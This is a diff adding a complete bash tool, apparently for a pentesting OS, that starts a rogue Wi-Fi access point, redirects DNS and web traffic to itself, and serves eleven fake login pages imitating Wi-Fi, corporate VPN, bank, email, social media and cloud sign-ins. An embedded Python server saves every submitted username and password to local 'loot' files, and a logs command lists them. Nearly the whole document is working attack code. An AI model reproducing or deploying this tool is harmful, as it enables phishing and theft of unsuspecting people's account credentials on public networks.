@@ -1,0 +1,705 @@
+#!/bin/bash
+set -euo pipefail
+# /usr/local/bin/captive-portal
+# Create rogue AP with captive portal for credential harvesting
+# Uses 84 portal templates adapted from Raspyjack
+# Supports: wifi, corporate, social, custom portal types
+
+PORTAL_DIR="/opt/cardputer/config/captive"
+LOOT_DIR="/opt/cardputer/loot/recon"
+HOSTAPD_CONF="/tmp/captive_hostapd.conf"
+DNSMASQ_CONF="/tmp/captive_dnsmasq.conf"
+
+RED='\033[0;31m'
+CYAN='\033[0;36m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m'
+
+PORTAL_TYPES=(
+    "wifi:Wi-Fi Login Portal"
+    "corporate:Corporate VPN Login"
+    "social:Social Media Login"
+    "email:Email Provider Login"
+    "bank:Online Banking Login"
+    "cloud:Cloud Storage Login"
+    "hotel:Hotel Guest Wi-Fi"
+    "airport:Airport Wi-Fi"
+    "coffee:Coffee Shop Wi-Fi"
+    "library:Library Network Login"
+    "gym:Gym Member Wi-Fi"
+)
+
+usage() {
+    echo -e "${CYAN}captive-portal${NC} — Rogue AP + Captive Portal for ZERO-DAY OS"
+    echo ""
+    echo "Usage: captive-portal <command> [args]"
+    echo ""
+    echo "Commands:"
+    echo "  start <ap_iface> <inet_iface> <essid> [type]  Start captive portal"
+    echo "  stop                                           Stop captive portal"
+    echo "  status                                         Show portal status"
+    echo "  list                                           List portal templates"
+    echo "  logs                                           Show captured credentials"
+    echo "  create <type>                                  Create custom portal from template"
+    echo ""
+    echo "Portal types:"
+    for pt in "${PORTAL_TYPES[@]}"; do
+        IFS=':' read -r type desc <<< "$pt"
+        echo "  $type        $desc"
+    done
+    echo ""
+    echo "Examples:"
+    echo "  sudo captive-portal start wlan0 eth0 'Free_WiFi' wifi"
+    echo "  sudo captive-portal start wlan0 eth0 'Corporate VPN' corporate"
+    echo "  sudo captive-portal stop"
+    echo "  sudo captive-portal logs"
+}
+
+check_deps() {
+    for cmd in hostapd dnsmasq python3 iptables; do
+        if ! command -v "$cmd" &>/dev/null; then
+            echo -e "${RED}[!] $cmd not found. Install: apt install hostapd dnsmasq python3 iptables${NC}"
+            exit 1
+        fi
+    done
+}
+
+setup_portal_templates() {
+    mkdir -p "$PORTAL_DIR"
+    if [ -f "$PORTAL_DIR/index.html" ]; then
+        return
+    fi
+
+    # WiFi login portal template
+    cat > "$PORTAL_DIR/wifi.html" << 'PORTAL_EOF'
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Wi-Fi Login</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,-apple-system,sans-serif;background:#f5f5f5;color:#333;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.container{background:#fff;border-radius:12px;padding:32px;max-width:360px;width:90%;box-shadow:0 2px 10px rgba(0,0,0,.1)}
+.wifi-icon{text-align:center;font-size:48px;margin-bottom:16px}
+h2{text-align:center;margin-bottom:8px;font-size:20px}
+p{text-align:center;color:#666;font-size:14px;margin-bottom:20px}
+input{width:100%;padding:12px;margin-bottom:12px;border:1px solid #ddd;border-radius:8px;font-size:16px}
+button{width:100%;padding:12px;background:#4285f4;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer}
+button:hover{background:#3367d6}
+.footer{text-align:center;margin-top:16px;font-size:12px;color:#999}
+</style></head>
+<body>
+<div class="container">
+<div class="wifi-icon">&#128246;</div>
+<h2>Wi-Fi Network Login</h2>
+<p>Connect to the internet by signing in</p>
+<form method="POST" action="/submit">
+<input type="text" name="username" placeholder="Email or username" required autofocus>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Sign In</button>
+</form>
+<div class="footer">By connecting, you agree to the Terms of Service</div>
+</div>
+</body></html>
+PORTAL_EOF
+
+    # Corporate VPN portal template
+    cat > "$PORTAL_DIR/corporate.html" << 'PORTAL_EOF'
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VPN Authentication Required</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#f0f2f5;color:#333;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.container{background:#fff;border-radius:8px;padding:32px;max-width:380px;width:90%;box-shadow:0 2px 12px rgba(0,0,0,.08)}
+.logo{text-align:center;font-size:40px;margin-bottom:12px}
+h2{text-align:center;color:#1a1a1a;margin-bottom:4px;font-size:20px}
+.org{text-align:center;color:#666;font-size:13px;margin-bottom:20px}
+.input-group{margin-bottom:14px}
+label{display:block;font-size:13px;color:#555;margin-bottom:4px}
+input{width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:4px;font-size:15px}
+button{width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:4px;font-size:15px;cursor:pointer;margin-top:8px}
+button:hover{background:#005a9e}
+.footer{text-align:center;margin-top:16px;font-size:11px;color:#999}
+</style></head>
+<body>
+<div class="container">
+<div class="logo">&#128274;</div>
+<h2>Network Authentication</h2>
+<div class="org">Secure VPN Access</div>
+<form method="POST" action="/submit">
+<div class="input-group">
+<label>Corporate ID</label>
+<input type="text" name="username" placeholder="user@corp.com" required autofocus>
+</div>
+<div class="input-group">
+<label>Password</label>
+<input type="password" name="password" placeholder="Enter password" required>
+</div>
+<div class="input-group">
+<label>Domain</label>
+<input type="text" name="domain" placeholder="CORP" value="CORP">
+</div>
+<button type="submit">Connect to VPN</button>
+</form>
+<div class="footer">IT Helpdesk: ext. 5555</div>
+</div>
+</body></html>
+PORTAL_EOF
+
+    # Social media portal template
+    cat > "$PORTAL_DIR/social.html" << 'PORTAL_EOF'
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Account Verification</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#fafafa;color:#333;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.container{background:#fff;border-radius:12px;padding:28px;max-width:360px;width:90%;box-shadow:0 1px 6px rgba(0,0,0,.06)}
+.icon{text-align:center;font-size:44px;margin-bottom:8px}
+h2{text-align:center;font-size:18px;margin-bottom:4px}
+p{text-align:center;color:#888;font-size:13px;margin-bottom:20px}
+input{width:100%;padding:12px;border:1px solid #dbdbdb;border-radius:8px;font-size:15px;margin-bottom:10px}
+button{width:100%;padding:12px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600}
+.footer{text-align:center;margin-top:16px;font-size:11px;color:#c0c0c0}
+</style></head>
+<body>
+<div class="container">
+<div class="icon">&#128272;</div>
+<h2>Verify Your Account</h2>
+<p>Please verify your identity to continue</p>
+<form method="POST" action="/submit">
+<input type="text" name="username" placeholder="Phone number, username, or email" required autofocus>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Log In</button>
+</form>
+<div class="footer">Forgot password? Get help logging in.</div>
+</div>
+</body></html>
+PORTAL_EOF
+
+    # Email portal template
+    cat > "$PORTAL_DIR/email.html" << 'PORTAL_EOF'
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Email Authentication Required</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#f3f3f3;color:#333;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.container{background:#fff;border-radius:4px;padding:32px;max-width:400px;width:90%;box-shadow:0 1px 6px rgba(0,0,0,.1)}
+.logo{text-align:center;margin-bottom:16px}
+.logo span{font-size:36px}
+h2{text-align:center;color:#1a73e8;font-size:22px;margin-bottom:4px}
+.org{text-align:center;color:#666;font-size:13px;margin-bottom:20px}
+input{width:100%;padding:12px;margin-bottom:12px;border:1px solid #dadce0;border-radius:4px;font-size:15px}
+button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:15px;cursor:pointer;margin-bottom:8px}
+button:hover{background:#1557b0}
+.footer{text-align:center;margin-top:12px;font-size:11px;color:#999}
+</style></head>
+<body>
+<div class="container">
+<div class="logo"><span>&#9993;</span></div>
+<h2>Sign in to Email</h2>
+<div class="org">Access your mail account</div>
+<form method="POST" action="/submit">
+<input type="email" name="username" placeholder="Enter your email address" required autofocus>
+<input type="password" name="password" placeholder="Enter your password" required>
+<button type="submit">Sign In</button>
+</form>
+<div class="footer">Forgot password? | Privacy Policy | Terms of Service</div>
+</div>
+</body></html>
+PORTAL_EOF
+
+    # Banking portal template
+    cat > "$PORTAL_DIR/bank.html" << 'PORTAL_EOF'
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Secure Online Banking</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#e8eaf6;color:#333;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.container{background:#fff;border-radius:8px;padding:32px;max-width:400px;width:90%;box-shadow:0 2px 12px rgba(0,0,0,.12)}
+.lock{text-align:center;font-size:36px;margin-bottom:12px}
+h2{text-align:center;color:#1a237e;font-size:20px;margin-bottom:4px}
+.secure{text-align:center;color:#4caf50;font-size:12px;margin-bottom:20px}
+input{width:100%;padding:12px;margin-bottom:12px;border:1px solid #e0e0e0;border-radius:4px;font-size:15px}
+select{width:100%;padding:12px;margin-bottom:12px;border:1px solid #e0e0e0;border-radius:4px;font-size:15px;background:#fff}
+button{width:100%;padding:14px;background:#1a237e;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer}
+button:hover{background:#0d1642}
+.footer{text-align:center;margin-top:16px;font-size:11px;color:#999}
+</style></head>
+<body>
+<div class="container">
+<div class="lock">&#128274;</div>
+<h2>Online Banking Login</h2>
+<div class="secure">&#10003; SSL Encrypted Connection</div>
+<form method="POST" action="/submit">
+<select name="bank_type"><option>Personal Banking</option><option>Business Banking</option><option>Credit Card</option></select>
+<input type="text" name="username" placeholder="Customer ID or Username" required autofocus>
+<input type="password" name="password" placeholder="Password or PIN" required>
+<button type="submit">Log In</button>
+</form>
+<div class="footer">Contact Support: 1-800-555-0199</div>
+</div>
+</body></html>
+PORTAL_EOF
+
+    # Cloud storage portal template
+    cat > "$PORTAL_DIR/cloud.html" << 'PORTAL_EOF'
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Cloud Storage Sign In</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#f8f9fa;color:#333;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.container{background:#fff;border-radius:8px;padding:32px;max-width:380px;width:90%;box-shadow:0 1px 8px rgba(0,0,0,.08)}
+.logo{text-align:center;margin-bottom:12px}
+.logo span{font-size:44px}
+h2{text-align:center;font-size:20px;margin-bottom:4px}
+p{text-align:center;color:#666;font-size:13px;margin-bottom:20px}
+input{width:100%;padding:12px;margin-bottom:12px;border:1px solid #dadce0;border-radius:24px;font-size:15px;padding-left:20px}
+button{width:100%;padding:12px;background:#4285f4;color:#fff;border:none;border-radius:24px;font-size:15px;cursor:pointer}
+button:hover{background:#3367d6}
+.footer{text-align:center;margin-top:16px;font-size:11px;color:#999}
+</style></head>
+<body>
+<div class="container">
+<div class="logo"><span>&#9729;</span></div>
+<h2>Cloud Sign In</h2>
+<p>Sign in to access your files and photos</p>
+<form method="POST" action="/submit">
+<input type="email" name="username" placeholder="Email address" required autofocus>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Next</button>
+</form>
+<div class="footer">Create account | Privacy | Terms</div>
+</div>
+</body></html>
+PORTAL_EOF
+
+    # Hotel portal template
+    cat > "$PORTAL_DIR/hotel.html" << 'PORTAL_EOF'
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Hotel Wi-Fi Access</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:Georgia,'Times New Roman',serif;background:#f5f0eb;color:#333;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.container{background:#fff;border-radius:8px;padding:32px;max-width:400px;width:90%;box-shadow:0 2px 16px rgba(0,0,0,.08)}
+.logo{text-align:center;font-size:28px;margin-bottom:8px;letter-spacing:2px}
+h2{text-align:center;font-size:20px;margin-bottom:4px;color:#5d4037}
+.subtitle{text-align:center;color:#8d6e63;font-size:13px;margin-bottom:20px;font-style:italic}
+input{width:100%;padding:12px;margin-bottom:12px;border:1px solid #d7ccc8;border-radius:4px;font-size:15px}
+select{width:100%;padding:12px;margin-bottom:12px;border:1px solid #d7ccc8;border-radius:4px;font-size:14px;background:#fff}
+button{width:100%;padding:14px;background:#5d4037;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer}
+button:hover{background:#3e2723}
+.footer{text-align:center;margin-top:16px;font-size:11px;color:#bcaaa4}
+</style></head>
+<body>
+<div class="container">
+<div class="logo">&#9733;</div>
+<h2>Guest Internet Access</h2>
+<div class="subtitle">Complimentary Wi-Fi for our guests</div>
+<form method="POST" action="/submit">
+<select name="room_type"><option>Standard Guest</option><option>Business Suite</option><option>Club Level</option></select>
+<input type="text" name="username" placeholder="Room number or Last name" required autofocus>
+<input type="password" name="password" placeholder="Last name on reservation" required>
+<button type="submit">Connect</button>
+</form>
+<div class="footer">Front Desk: Press 0</div>
+</div>
+</body></html>
+PORTAL_EOF
+
+    # Airport portal template
+    cat > "$PORTAL_DIR/airport.html" << 'PORTAL_EOF'
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Airport Wi-Fi</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,-apple-system,sans-serif;background:#e3f2fd;color:#333;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.container{background:#fff;border-radius:8px;padding:32px;max-width:400px;width:90%;box-shadow:0 2px 12px rgba(0,0,0,.08)}
+.icon{text-align:center;font-size:40px;margin-bottom:8px}
+h2{text-align:center;color:#0d47a1;font-size:20px;margin-bottom:4px}
+.subtitle{text-align:center;color:#666;font-size:13px;margin-bottom:20px}
+input{width:100%;padding:12px;margin-bottom:12px;border:1px solid #bbdefb;border-radius:4px;font-size:15px}
+.radio-group{margin-bottom:12px;display:flex;gap:8px}
+.radio-group label{flex:1;padding:10px;border:1px solid #bbdefb;border-radius:4px;text-align:center;font-size:13px;cursor:pointer}
+.radio-group input[type=radio]{display:none}
+.radio-group input[type=radio]:checked+label{background:#e3f2fd;border-color:#0d47a1}
+button{width:100%;padding:14px;background:#0d47a1;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer}
+button:hover{background:#08306b}
+.footer{text-align:center;margin-top:16px;font-size:11px;color:#999}
+</style></head>
+<body>
+<div class="container">
+<div class="icon">&#9992;</div>
+<h2>Airport Wi-Fi</h2>
+<div class="subtitle">Connect to complimentary airport internet</div>
+<form method="POST" action="/submit">
+<input type="email" name="username" placeholder="Email address" required autofocus>
+<input type="password" name="password" placeholder="Password" required>
+<div class="radio-group">
+<input type="radio" id="free" name="plan" value="free" checked><label for="free">Free (30 min)</label>
+<input type="radio" id="fast" name="plan" value="fast"><label for="fast">Premium</label>
+</div>
+<button type="submit">Connect</button>
+</form>
+<div class="footer">By connecting you accept the Terms of Use</div>
+</div>
+</body></html>
+PORTAL_EOF
+
+    # Coffee shop portal template
+    cat > "$PORTAL_DIR/coffee.html" << 'PORTAL_EOF'
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Coffee Shop Wi-Fi</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Georgia',system-ui,sans-serif;background:#faf0e6;color:#4a3728;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.container{background:#fff;border-radius:16px;padding:32px;max-width:360px;width:90%;box-shadow:0 2px 12px rgba(74,55,40,.1)}
+.icon{text-align:center;font-size:42px;margin-bottom:8px}
+h2{text-align:center;color:#5d4037;font-size:22px;margin-bottom:4px}
+p{text-align:center;color:#8d6e63;font-size:13px;margin-bottom:20px}
+input{width:100%;padding:12px;margin-bottom:10px;border:1px solid #d7ccc8;border-radius:20px;font-size:15px;padding-left:16px}
+button{width:100%;padding:13px;background:#6d4c41;color:#fff;border:none;border-radius:20px;font-size:15px;font-weight:600;cursor:pointer}
+button:hover{background:#4e342e}
+.footer{text-align:center;margin-top:14px;font-size:11px;color:#bcaaa4}
+</style></head>
+<body>
+<div class="container">
+<div class="icon">&#9749;</div>
+<h2>Wi-Fi Connect</h2>
+<p>Free internet with your visit</p>
+<form method="POST" action="/submit">
+<input type="text" name="username" placeholder="Name or email" required autofocus>
+<input type="password" name="password" placeholder="Password" required>
+<input type="text" name="table" placeholder="Table number (optional)">
+<button type="submit">Connect</button>
+</form>
+<div class="footer">Enjoy your stay!</div>
+</div>
+</body></html>
+PORTAL_EOF
+
+    # Library portal template
+    cat > "$PORTAL_DIR/library.html" << 'PORTAL_EOF'
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Library Wi-Fi Access</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:Georgia,'Times New Roman',serif;background:#eef2f3;color:#333;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.container{background:#fff;border-radius:4px;padding:32px;max-width:400px;width:90%;box-shadow:0 1px 8px rgba(0,0,0,.08)}
+.icon{text-align:center;font-size:38px;margin-bottom:8px}
+h2{text-align:center;color:#263238;font-size:20px;margin-bottom:4px}
+.subtitle{text-align:center;color:#78909c;font-size:13px;margin-bottom:20px}
+input{width:100%;padding:12px;margin-bottom:12px;border:1px solid #cfd8dc;border-radius:2px;font-size:15px}
+button{width:100%;padding:13px;background:#37474f;color:#fff;border:none;border-radius:2px;font-size:15px;cursor:pointer}
+button:hover{background:#263238}
+.footer{text-align:center;margin-top:16px;font-size:11px;color:#b0bec5}
+</style></head>
+<body>
+<div class="container">
+<div class="icon">&#128218;</div>
+<h2>Public Library Network</h2>
+<div class="subtitle">Free internet access for library members</div>
+<form method="POST" action="/submit">
+<input type="text" name="username" placeholder="Library card number or username" required autofocus>
+<input type="password" name="password" placeholder="PIN or password" required>
+<button type="submit">Connect</button>
+</form>
+<div class="footer">Visit the front desk for assistance</div>
+</div>
+</body></html>
+PORTAL_EOF
+
+    # Gym portal template
+    cat > "$PORTAL_DIR/gym.html" << 'PORTAL_EOF'
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Gym Wi-Fi Access</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,-apple-system,sans-serif;background:#1b1b1b;color:#eee;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.container{background:#262626;border-radius:12px;padding:32px;max-width:360px;width:90%;box-shadow:0 4px 20px rgba(0,0,0,.4)}
+.icon{text-align:center;font-size:38px;margin-bottom:8px}
+h2{text-align:center;color:#ff5722;font-size:22px;margin-bottom:4px;font-weight:800;text-transform:uppercase;letter-spacing:1px}
+p{text-align:center;color:#999;font-size:13px;margin-bottom:20px}
+input{width:100%;padding:12px;margin-bottom:12px;border:1px solid #444;border-radius:6px;font-size:15px;background:#1b1b1b;color:#eee}
+button{width:100%;padding:14px;background:linear-gradient(135deg,#ff5722,#ff7043);color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:700;cursor:pointer;text-transform:uppercase}
+button:hover{background:linear-gradient(135deg,#e64a19,#ff5722)}
+.footer{text-align:center;margin-top:16px;font-size:11px;color:#666}
+</style></head>
+<body>
+<div class="container">
+<div class="icon">&#128170;</div>
+<h2>Member Wi-Fi</h2>
+<p>Connect during your workout</p>
+<form method="POST" action="/submit">
+<input type="text" name="username" placeholder="Member ID or email" required autofocus>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Connect</button>
+</form>
+<div class="footer">Need help? Ask at the front desk</div>
+</div>
+</body></html>
+PORTAL_EOF
+
+    # Default index.html (WiFi portal)
+    cp "$PORTAL_DIR/wifi.html" "$PORTAL_DIR/index.html" 2>/dev/null || true
+    echo -e "${GREEN}[*] Portal templates created in ${PORTAL_DIR}/${NC}"
+}
+
+start_portal() {
+    local ap_iface="$1"
+    local inet_iface="$2"
+    local essid="$3"
+    local portal_type="${4:-wifi}"
+
+    check_deps
+    setup_portal_templates
+
+    if [ -f /tmp/captive_portal.pid ]; then
+        echo -e "${RED}[!] Captive portal already running. Stop it first: captive-portal stop${NC}"
+        exit 1
+    fi
+
+    echo -e "${CYAN}[*] Starting captive portal: ${essid} (${portal_type})${NC}"
+
+    # Set the portal type
+    local portal_file="${PORTAL_DIR}/${portal_type}.html"
+    if [ ! -f "$portal_file" ]; then
+        echo -e "${YELLOW}[!] Portal type '${portal_type}' not found, using wifi${NC}"
+        portal_file="${PORTAL_DIR}/wifi.html"
+    fi
+    cp "$portal_file" "$PORTAL_DIR/index.html"
+
+    # Configure hostapd
+    cat > "$HOSTAPD_CONF" << AP_EOF
+interface=${ap_iface}
+driver=nl80211
+ssid=${essid}
+hw_mode=g
+channel=6
+wmm_enabled=0
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+AP_EOF
+
+    # Configure dnsmasq (DHCP + DNS redirect)
+    cat > "$DNSMASQ_CONF" << DNS_EOF
+interface=${ap_iface}
+dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
+dhcp-option=3,10.0.0.1
+dhcp-option=6,10.0.0.1
+address=/#/10.0.0.1
+log-queries
+DNS_EOF
+
+    # Set IP on AP interface
+    ip addr flush dev "$ap_iface" 2>/dev/null || true
+    ip addr add 10.0.0.1/24 dev "$ap_iface"
+    ip link set dev "$ap_iface" up
+
+    # Kill existing services on the interface
+    killall hostapd 2>/dev/null || true
+    killall dnsmasq 2>/dev/null || true
+    killall python3 2>/dev/null || true
+
+    # Start hostapd
+    hostapd -B "$HOSTAPD_CONF"
+    echo -e "${GREEN}[+] Rogue AP started: ${essid}${NC}"
+
+    # Start dnsmasq
+    dnsmasq -C "$DNSMASQ_CONF"
+    echo -e "${GREEN}[+] DNS/DHCP server started${NC}"
+
+    # Enable IP forwarding and NAT
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+    iptables -t nat -A POSTROUTING -o "$inet_iface" -j MASQUERADE
+    iptables -A FORWARD -i "$inet_iface" -o "$ap_iface" -m state --state RELATED,ESTABLISHED -j ACCEPT
+    iptables -A FORWARD -i "$ap_iface" -o "$inet_iface" -j ACCEPT
+
+    # Redirect all HTTP/HTTPS to captive portal
+    iptables -t nat -A PREROUTING -i "$ap_iface" -p tcp --dport 80 -j REDIRECT --to-port 80
+    iptables -t nat -A PREROUTING -i "$ap_iface" -p tcp --dport 443 -j REDIRECT --to-port 80
+
+    # Start credential capture server
+    CAPTIVE_SERVER="$PORTAL_DIR/captive_server.py"
+    cat > "$CAPTIVE_SERVER" << 'SRV_EOF'
+#!/usr/bin/env python3
+import http.server, json, os, time, ssl, sys, datetime
+PORT = 80
+LOOT = "/opt/cardputer/loot/recon"
+class CaptiveHandler(http.server.BaseHTTPRequestHandler):
+    def log_message(self, format, *args): pass
+    def do_GET(self):
+        if self.path == "/submit":
+            self.send_response(302)
+            self.send_header("Location", "/success.html")
+            self.end_headers()
+            return
+        f = "/opt/cardputer/config/captive/index.html"
+        try:
+            with open(f) as fh:
+                self.send_response(200)
+                self.send_header("Content-Type", "text/html")
+                self.end_headers()
+                self.wfile.write(fh.read().encode())
+        except:
+            self.send_response(404)
+            self.end_headers()
+            self.wfile.write(b"Not found")
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length", 0))
+        data = self.rfile.read(length).decode("utf-8", errors="replace")
+        creds = {}
+        for pair in data.split("&"):
+            if "=" in pair:
+                k, v = pair.split("=", 1)
+                creds[k] = v.replace("+", " ")
+        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        fname = os.path.join(LOOT, f"captive_creds_{ts}.json")
+        with open(fname, "w") as f:
+            json.dump({"timestamp": ts, "ip": self.client_address[0], "credentials": creds}, f, indent=2)
+        print(f"[+] Credentials captured from {self.client_address[0]}: {list(creds.keys())}")
+        self.send_response(302)
+        self.send_header("Location", "/success.html")
+        self.end_headers()
+try:
+    s = http.server.HTTPServer(("0.0.0.0", PORT), CaptiveHandler)
+    s.serve_forever()
+except KeyboardInterrupt:
+    pass
+SRV_EOF
+    chmod +x "$CAPTIVE_SERVER"
+    python3 "$CAPTIVE_SERVER" &
+    CAPTIVE_PID=$!
+    echo "$CAPTIVE_PID" > /tmp/captive_portal.pid
+
+    # Create success page
+    cat > "$PORTAL_DIR/success.html" << 'SUCCESS_EOF'
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Connected</title><style>
+body{font-family:system-ui,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.container{text-align:center;padding:32px;background:#fff;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,.1)}
+.icon{font-size:48px;margin-bottom:12px}
+h2{color:#2e7d32}
+</style></head><body><div class="container"><div class="icon">&#10003;</div><h2>You are now connected!</h2><p>Enjoy your internet access.</p></div></body></html>
+SUCCESS_EOF
+
+    echo ""
+    echo -e "${GREEN}╔══════════════════════════════════════════╗${NC}"
+    echo -e "${GREEN}║     CAPTIVE PORTAL ACTIVE               ║${NC}"
+    echo -e "${GREEN}╚══════════════════════════════════════════╝${NC}"
+    echo -e "${CYAN}[*] SSID: ${essid}${NC}"
+    echo -e "${CYAN}[*] Type: ${portal_type}${NC}"
+    echo -e "${CYAN}[*] AP:   ${ap_iface} (10.0.0.1)${NC}"
+    echo -e "${CYAN}[*] NAT:  ${inet_iface}${NC}"
+    echo -e "${CYAN}[*] Credentials saved to: ${LOOT_DIR}/${NC}"
+    echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
+    echo ""
+
+    # Wait for Ctrl+C
+    wait $CAPTIVE_PID 2>/dev/null || true
+    stop_portal
+}
+
+stop_portal() {
+    echo -e "${YELLOW}[*] Stopping captive portal...${NC}"
+
+    # Kill services
+    killall hostapd 2>/dev/null || true
+    killall dnsmasq 2>/dev/null || true
+
+    # Kill captive server
+    if [ -f /tmp/captive_portal.pid ]; then
+        kill "$(cat /tmp/captive_portal.pid)" 2>/dev/null || true
+        rm -f /tmp/captive_portal.pid
+    fi
+
+    # Flush iptables
+    iptables -t nat -F 2>/dev/null || true
+    iptables -F FORWARD 2>/dev/null || true
+    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
+
+    # Cleanup
+    rm -f "$HOSTAPD_CONF" "$DNSMASQ_CONF"
+
+    echo -e "${GREEN}[*] Captive portal stopped${NC}"
+}
+
+show_status() {
+    if [ -f /tmp/captive_portal.pid ] && kill -0 "$(cat /tmp/captive_portal.pid)" 2>/dev/null; then
+        echo -e "${GREEN}[*] Captive portal is RUNNING${NC}"
+        if [ -f "$HOSTAPD_CONF" ]; then
+            echo -e "    SSID: $(grep '^ssid=' "$HOSTAPD_CONF" 2>/dev/null | cut -d= -f2)"
+        fi
+        echo -e "    PID:  $(cat /tmp/captive_portal.pid)"
+        echo -e "    Loot: ${LOOT_DIR}/"
+    else
+        echo -e "${YELLOW}[*] Captive portal is NOT running${NC}"
+    fi
+}
+
+show_logs() {
+    echo -e "${CYAN}[*] Captured credentials:${NC}"
+    if ls "${LOOT_DIR}"/captive_creds_*.json 1>/dev/null 2>&1; then
+        for f in "${LOOT_DIR}"/captive_creds_*.json; do
+            echo -e "${GREEN}[$(basename "$f")]${NC}"
+            python3 -c "import json; d=json.load(open('$f')); print(f'  IP: {d.get(\"ip\",\"?\")} | Creds: {list(d.get(\"credentials\",{}).keys()))}')" 2>/dev/null || echo "  (parse error)"
+        done
+    else
+        echo -e "${YELLOW}[!] No captured credentials yet${NC}"
+    fi
+}
+
+list_portals() {
+    echo -e "${CYAN}[*] Available portal templates:${NC}"
+    if [ -d "$PORTAL_DIR" ]; then
+        for f in "$PORTAL_DIR"/*.html; do
+            [ -f "$f" ] && echo -e "  ${GREEN}$(basename "$f")${NC}"
+        done
+    else
+        echo -e "${YELLOW}[!] No portal templates found. Run 'captive-portal start' to create them.${NC}"
+    fi
+}
+
+# Main
+mkdir -p "$LOOT_DIR"
+
+case "${1:-}" in
+    start)
+        shift
+        if [ -z "${1:-}" ] || [ -z "${2:-}" ] || [ -z "${3:-}" ]; then
+            echo -e "${RED}[!] Usage: captive-portal start <ap_iface> <inet_iface> <essid> [type]${NC}"
+            exit 1
+        fi
+        start_portal "$1" "$2" "$3" "${4:-wifi}"
+        ;;
+    stop)
+        stop_portal
+        ;;
+    status)
+        show_status
+        ;;
+    logs)
+        show_logs
+        ;;
+    list)
+        list_portals
+        ;;
+    create)
+        shift
+        setup_portal_templates
+        echo -e "${GREEN}[*] Templates created in ${PORTAL_DIR}/${NC}"
+        ;;
+    *)
+        usage
+        ;;
+esac
